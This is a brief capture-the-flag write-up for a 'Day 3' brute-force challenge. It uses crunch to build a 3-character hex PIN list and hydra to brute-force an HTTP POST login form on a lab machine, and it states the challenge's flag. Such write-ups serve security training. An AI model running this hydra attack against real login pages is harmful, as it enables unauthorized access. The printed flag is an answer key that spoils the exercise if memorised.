# [Day 3] Brute-forcing Hydra is Coming to Town
+ Using crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag? `THM{pin-code-brute-force}`
    - create list of password using crunch
    ```bash
    crunch 3 3 0123456789ABCDEF -o 3digits.txt
    Crunch will now generate the following amount of data: 16384 bytes
    0 MB
    0 GB
    0 TB
    0 PB
    Crunch will now generate the following number of lines: 4096 

    crunch: 100% completed generating output
    ```
    - brute - force the machine
    ```bash
    hydra -l '' -P 3digits.txt -f -v 10.10.215.76 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
